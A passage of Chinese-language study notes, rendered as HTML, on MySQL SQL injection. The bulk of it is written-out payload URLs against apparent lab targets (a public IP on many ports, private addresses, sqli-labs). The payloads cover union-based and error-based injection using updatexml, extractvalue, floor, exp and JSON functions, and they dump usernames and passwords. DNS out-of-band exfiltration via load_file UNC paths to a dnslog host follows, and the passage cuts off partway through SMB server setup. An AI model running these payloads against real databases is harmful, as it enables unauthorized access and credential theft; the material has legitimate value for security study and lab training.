+<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://1.14.28.17:46649/string.php?id=1'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">and1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">//字符型</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>获取数据信息</p>
+<ol>
+<li>
+<p>判断注入点字段数</p>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' order by 1%23</span></span>
+<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://1.14.28.17:46649/string.php?id=1'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> order by</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">58551</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' group by 3%23</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>判断注入点回显位置</p>
+<p>关于     <span data-type="text" style="background-color: var(--b3-font-background9);">select 1,2,3</span>    的理解。</p>
+<ol>
+<li>
+<p>不管你select语句后的字段名是什么，他都会原封不动的回显出来。</p>
+<figure><figcaption>image</figcaption></figure>
+</li>
+<li>
+<p>在返回结果中，总是返回一行数据。</p>
+</li>
+<li>
+<p>字段名和返回的这一行数据是对应相等的，他们都等于你输入的select语句后的字段名</p>
+</li>
+<li>
+<p>返回的那一行数据的列数，等于你输入的select语句后的字段名的个数</p>
+</li>
+</ol>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' union select 1,2,3%23</span></span>
+<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://1.14.28.17:46649/string.php?id=0'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> union</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> select</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>获取数据库信息</p>
+<ul>
+<li>
+<p>获取【数据库版本、数据库类型】</p>
+<p><code>database() </code> 当前数据库名</p>
+<p><code>version()</code>  数据库版本</p>
+<p><code>user() </code> 连接用户</p>
+<p>mysql &gt;5.0 information_schemata库中/SCHEMATA</p>
+</li>
+<li>
+<p>获取【数据库名】</p>
+<p>limit 0,1   <span data-type="text" style="background-color: var(--b3-font-background8);">控制结果返回行数</span> 第一个参数是从0开始，代表从第一个结果开始。第二参数为行数，从1开始，代表返回一行。</p>
+<figure><figcaption>image</figcaption></figure>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">15460</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' union select 1,schema_name,user() from information_schema.schemata limit 4,1#</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><code>order by</code>  <span data-type="text" style="background-color: var(--b3-font-background8);">排序</span> <code>order by id</code>   用id字段进行排序 asc  desc</p>
+<p><code>group by </code>  <span data-type="text" style="background-color: var(--b3-font-background9);">分组排序</span> <code>select username,count(id) from users group by id;</code></p>
+<p><code>concat()</code>  <span data-type="text" style="background-color: var(--b3-font-background8);">拼接字符串</span>：<code>select concat('a','b','c'); ==&gt; 'abc'</code></p>
+<p><code>concat_ws()</code> <span data-type="text" style="background-color: var(--b3-font-background8);"> 指定字符拼接</span>:  <code> select concat_ws('@','a','b','c'); ==&gt; 'a@b@c'</code></p>
+<p><code>group_concat ()</code> 将查询的多行结果拼接在一行进行显示:   <code> select group_concat(id) from users;</code></p>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">15460</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' union select 1,group_concat(schema_name),user() from information_schema.schemata#</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>information_schema.schemata  数据库名.表名   该表存放了数据库信息</p>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<p>limit 0,1 ==&gt; 控制结果返回行数 第一个参数是从0开始，代表从第一个结果开始。第二参数为行数，从1开始，代表返回一行。★</p>
+<p>order by  ==&gt; 指定某个字段进行排序 order by id 从id字段进行排序 asc desc</p>
+<p>group by  ==&gt; 利用分组排序 select username,count(id) from users group by id;</p>
+</li>
+<li>
+<p>查询当前数据库内所有的【表名】</p>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<p>注意：mysql中的where用于条件查询，where table_schema=database() 表示把 table_schema字段=数据库名（message）的字段查询出来，如果不加这一句的话，全部table_secema对应的table_name都会被查询出来。</p>
+<div class="language-url line-numbers-mode" data-highlighter="shiki" data-ext="url" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-url"><span class="line"><span>http://1.14.28.17:58551/string.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()%23</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>http://1.14.28.17:58551/string.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema='message'%23</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><figcaption>image</figcaption></figure>
+</li>
+<li>
+<p>查询security数据库内users表名【字段名】</p>
+<figure><figcaption>image</figcaption></figure>
+<figure><figcaption>image</figcaption></figure>
+<div class="language-url line-numbers-mode" data-highlighter="shiki" data-ext="url" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-url"><span class="line"><span>http://1.14.28.17:58551/string.php?id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name='users'%23</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>和查询数据库名一样，group_concat(column_name) 查询字段名一行显示，在information_schema.COLUMNS这个表中，条件为TABLE_SCHEMA=database() and TABLE_NAME='users'.</p>
+</li>
+<li>
+<p>查询字段对应的【数据】</p>
+<figure><figcaption>image</figcaption></figure>
+<div class="language-url line-numbers-mode" data-highlighter="shiki" data-ext="url" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-url"><span class="line"><span>http://1.14.28.17:58551/string.php?id=0' union select 1,group_concat(username),group_concat(password) from security.users%23</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
+<li>
+<p>解密数据</p>
+<p>md5 ==&gt; <a href="http://cmd5.org" target="_blank" rel="noopener noreferrer">cmd5.org</a>(base64 sha1 sha256 sha512) <a href="http://somd5.com" target="_blank" rel="noopener noreferrer">somd5.com</a></p>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>提升权限</p>
+</li>
+<li>
+<p>内网渗透</p>
+</li>
+</ol>
+<h2>报错注入</h2>
+<ul>
+<li>
+<p><code>mysql(i)_error()</code>  输出mysql数据库的错误信息</p>
+</li>
+<li>
+<p><code>extractvalue()</code> 函数主要用于<strong>从XML文档中提取数据。</strong></p>
+</li>
+<li>
+<p>payload: 攻击载荷 ==&gt; 漏洞利用的代码</p>
+</li>
+<li>
+<p><code>0x7e</code> 是十六进制表示的波浪线（<code>~</code>）字符。</p>
+</li>
+<li>
+<p><code>(select user())</code> 是一个SQL查询，返回当前数据库的用户名。</p>
+</li>
+</ul>
+<h3>xpath报错</h3>
+<p>0x7e就是~  不属于xpath语法格式，因此报出xpath语法错误。★</p>
+<h5><strong>updatexml()</strong></h5>
+<ul>
+<li>作用：改变文档中符合条件的节点的值，使用不同的xml标记匹配和替换xml块的函数。</li>
+<li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li>
+<li>原理：updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3));   由于<span data-type="text" style="color: var(--b3-font-color9);">0x7e是~</span>，<span data-type="text" style="color: var(--b3-font-color8);">不属于xpath语法格式，因此报出xpath语法错误</span>。</li>
+</ul>
+<h5><strong>extractvalue（）</strong></h5>
+<ul>
+<li>
+<p>作用：此函数从目标XML中返回包含所查询值的字符串</p>
+</li>
+<li>
+<p>语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
+</li>
+<li>
+<p>原理：extractvalue使用时当xpath_string<span data-type="text" style="color: var(--b3-font-color9);">格式出现错误</span>，<span data-type="text" style="color: var(--b3-font-color10);">mysql则会爆出xpath语法错误</span>（xpath syntax）</p>
+</li>
+<li>
+<p>例如：select user,password from users where user_id=1 and (extractvalue(1,0x7e));   由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</p>
+</li>
+</ul>
+<h5>使用条件</h5>
+<pre><code>    mysql&gt;5.1
+xpath 报错内容有32位长度限制
+</code></pre>
+<h5>payload</h5>
+<pre><code>payload:   &lt;span data-type="text" style="color: var(--b3-font-color8);"&gt;and extractvalue(1,concat(0x7e,(select user()),0x7e))  &lt;/span&gt;        ((20240819160743-0w86e8t "concat()  拼接字符串：select concat(&amp;apos;a&amp;apos;,&amp;apos;b&amp;apos;,&amp;apos;c&amp;apos;); ==&amp;gt; &amp;apos;abc&amp;apos;"))
+payload:   &lt;span data-type="text" style="color: var(--b3-font-color8);"&gt; and updatexml(1,concat(0x7e,(select user()),0x7e),1)&lt;/span&gt;
+</code></pre>
+<h4>注入流程</h4>
+<ol>
+<li>
+<p>判断是否存在注入</p>
+<p><a href="http://1.14.28.17:13815/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=1</a>' and 1=1%23</p>
+<figure><figcaption>image</figcaption></figure>
+<p><a href="http://1.14.28.17:13815/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=1</a>' and 1=2%23</p>
+<figure><figcaption>image</figcaption></figure>
+</li>
+<li>
+<p>判断注入点类型</p>
+<p><a href="http://1.14.28.17:13815/string.php?id=-1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=-1</a>' union select 1,2,3%23</p>
+<figure><figcaption>image</figcaption></figure>
+<p><a href="http://1.14.28.17:13815/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select user())))%23</p>
+<figure><figcaption>image</figcaption></figure>
+<p><a href="http://1.14.28.17:13815/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select group_concat(schema_name) from information_schema.schemata)))%23</p>
+<figure><figcaption>image</figcaption></figure>
+</li>
+<li>
+<p>查询库名</p>
+<blockquote>
+<p>mysql 截取函数<br>
+substr substring mid left right<br>
+use security;select substr(database(),1,2) ==&gt; se<br>
+use security;select left(database(),1) ==&gt; s 从左向右截取<br>
+use security;select right(database(),1) ==&gt; y 从右向左截取</p>
+</blockquote>
+<p>通过截取函数绕过长度限制</p>
+<figure><figcaption>image</figcaption></figure>
+<p><a href="http://1.14.28.17:28330/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:28330/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select substr((select group_concat(schema_name) from information_schema.schemata),1,31))))%23</p>
+<figure><figcaption>image</figcaption></figure>
+<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">http:</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.100.40:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">43013</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">string.php</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">?</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' and extractvalue(1,concat(0x7c,(select substr((select group_concat(schema_name) from information_schema.schemata),32,31))))%23</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><figure><figcaption>image</figcaption></figure>
+<p><code>http://192.168.100.40:43013/string.php?id=1' and extractvalue(1,concat(0x7c,(select substr((select group_concat(schema_name) from information_schema.schemata),63,31))))%23</code><br></p>
+</li>
+<li>
+<p>查询字段名</p>
+<p><a href="http://192.168.100.40:43013/string.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:43013/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,31))))%23</p>
+<figure><figcaption>image</figcaption></figure>
+</li>
+<li>
+<p>查数据</p>
+<p><a href="http://192.168.100.40:43013/string.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:43013/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select substr((select group_concat(id,'<em>',username,'</em>',password) from users),1,31))))%23</p>
+<p><a href="http://192.168.100.40:43013/string.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:43013/string.php?id=1</a>' and updatexml(1,concat(0x7e,(select substr((select group_concat(id,'<em>',username,'</em>',password) from users),1,31)),0x7e),1)%23</p>
+</li>
+</ol>
+<h3>floor报错函数</h3>
+<h4>使用条件</h4>
+<p>mysql &gt; 5.0<br>
+floor 取整数部分<br>
+floor 报错只允许查询返回一行结果</p>
+<h4>payload</h4>
+<p>and (select 1 from (select count( <em>),concat(user(),floor(rand(0)</em> 2))x from information_schema.tables group by x)y)</p>
+<div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-html"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">http://192.168.100.40:58222/string.php?id=1' and (select 1 from (select count( *),concat((select schema_name from information_schema.schemata limit 0,1),floor(rand(0)* 2))x from information_schema.tables group by x)y)%23</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><figure><figcaption>image</figcaption></figure>
+<h3>列名重复报错注入</h3>
+<p>name_const()函数在低版本中可以支持5.0，但是在大于5.1小于5.5 中就不支持了</p>
+<p>payload：<code>and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a)%23</code></p>
+<p><a href="http://192.168.100.40:58222/string.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:58222/string.php?id=1</a>' and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a)%23</p>
+<h3>整形溢出报错注入</h3>
+<pre><code>条件：mysql 5.5.5及以上版本不支持
+说明：exp是以e为底的指数函数，由于数字太大会产生溢出。该函数会在参数大于709时溢出，产生报错
+Payload：and exp(~(select * from (select user()) a) )
+</code></pre>
+<p><a href="http://192.168.100.40:64606/string.php?id=1%27%20and%20exp(~(select%20*%20from%20(select%20user()" target="_blank" rel="noopener noreferrer">http://192.168.100.40:64606/string.php?id=1' and exp(~(select * from (select user()</a>)a))%23</p>
+<figure><figcaption>image</figcaption></figure>
+<h3>几何函数报错注入</h3>
+<p>条件：高版本MySQL无法得到数据 &gt;5.5.47 失败<br>
+相关函数：geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()<br>
+说明：函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错<br>
+标准Payload：<code>select multipoint((select * from (select * from (select * from (select version())a)b)c))</code></p>
+<h3>JSON数据报错注入</h3>
+<p>条件：mysql 5.7.8以上版本<br>
+说明：从 MySQL 5.7.8 开始⽀持由RFC 7159 JSON 定义的本机数据类型 ，可以有效地访问 JSON（JavaScript Object Notation）文档中的数据。</p>
+<h4>json 数据格式</h4>
+<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{username:'admin',password:'admin'}</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>JSON_TYPE</h4>
+<p>JSON_TYPE函数获取JSON值的类型，当我们传⼊的值不属于json格式则报错。<br>
+JSON_TYPE(version())<br>
+Payload:   id=1' and json_type(version())%23</p>
+<h4>JSON_EXTRACT()</h4>
+<p>JSON_EXTRACT(json_doc, path[, path] ...)<br>
+JSON_EXTRACT函数从 JSON ⽂档中返回数据，从与path参数匹配的⽂档部分中选择]<br>
+当第⼀个参数不是json类型的值则报错<br>
+JSON_EXTRACT(version(), '$[1]’)<br>
+JSON_EXTRACT((select user()),'$.a')<br>
+Payload:   id=1' and json_extract(user(),'$.a')%23<br>
+Payload:   id=1' and json_extract('[1,2,3]',user())%23</p>
+<h4>JSON_ARRAY_APPEND()</h4>
+<p>JSON_ARRAY_APPEND(json_doc, path, val[, path, val] ...)<br>
+将值附加到 JSON ⽂档中指定数组的末尾并返回结果，报错输出原理和json_extract函数相同。<br>
+select JSON_ARRAY_APPEND(version(),1,1);<br>
+select JSON_ARRAY_APPEND('[1,2]',version(),1);<br>
+Payload:   id=1' and JSON_ARRAY_APPEND('[1,2,3]’,user(),1)%23</p>
+<h2>数据外带</h2>
+<h4>DNS数据外带</h4>
+<ol>
+<li>
+<p>利用windows UNC路径组合mysql的load_file函数读取远程服务器的文件来实现将本地子查询语句拼接到域名中，实现dnslog数据外带。</p>
+</li>
+<li>
+<p><code>\</code>​<span data-type="text" style="background-color: var(--b3-font-background8);">的作用是转义</span>   \\\\==&gt;转义为\\</p>
+</li>
+<li>
+<p>DNS有61位长度限制，超过就无法显示。</p>
+</li>
+<li>
+<p>DNS数据外带网站：<a href="https://dnslog.org/" target="_blank" rel="noopener noreferrer">dnslog.org/</a></p>
+</li>
+<li>
+<p>数据库字段的值可能存在特殊符号，由于域名有一定规范，不能存在特殊符号，这些特殊符号拼接在域名里是无法做dns查询的。可以用hex编码或asci,将含特殊符号的数据外带出。<br>
+char(ascii(databas())     hex(database())</p>
+</li>
+<li>
+<p>payload：and load_file(concat('\\',database(),'cbffba4a.log.dnslog.store.'))%23</p>
+<p><a href="http://192.168.100.223/sqli-labs/less-1/?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.223/sqli-labs/less-1/?id=1</a>' and load_file(concat('\\',(select database()),'.cbffba4a.log.dnslog.store.\1.txt'))%23<a href="http://192.168.100.223/sqli-labs/less-1/?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.223/sqli-labs/less-1/?id=1</a>' and load_file(concat('\\',(select schema_name from information_schema.schemata limit 0,1),'.cbffba4a.log.dnslog.store.\1.txt'))%23</p>
+</li>
+</ol>
+<h4>SMB数据外带</h4>
+<h5>SMB</h5>
+<p>Server Message Block-SMB,即服务（器）消息块，是IBM公司在80年代中期发明的一种文件共享协<br>
+议。它只是系统之间通信的一种方式（协蚁），并不是一款特殊的软件。SMB协议被设计成为允许计算机<br>
+通过本地局域网(LAN)在远程主机上读写文件。远程主机上通过SMB协议开放访问的目录称为共享文<br>
+件夹。</p>
+<h5>CIFS</h5>
+<p>Common Internet File System-ClFS,即通用因特网文件系统。ClFS由美国微软公司开发。</p>
+<h5>Samba</h5>
+<p>Samba是一组不同功能程序组成的应用集合，它能让Liux服务器实现文件服务器、身份授权和认证、名称解析和打印服务等功能。与ClFS类似，Samba也是SMB协议的实现，它允许Windows客户访问Linux系统上的目录、打印机和文件(就像访问Windows服务器时一样)。重要的是，Samba可以将Linux服务器构建成一个域控制器。这样一来，就可以直接使用Windows域中的用户凭据，免去手动在Liux服务器上重新创建的麻烦。</p>
+<h5>SMB外带步骤</h5>
+<ol>
+<li>
+<p>Centos安装SMB</p>
+<p>安装：yum install samba samba-client samba-common -y</p>
+<pre><code>        yum -y install samba
+</code></pre>
+<p>查看安装：rpm -qa |grep samba</p>
+<p>开机自启：systemctl enable smb.service<br>
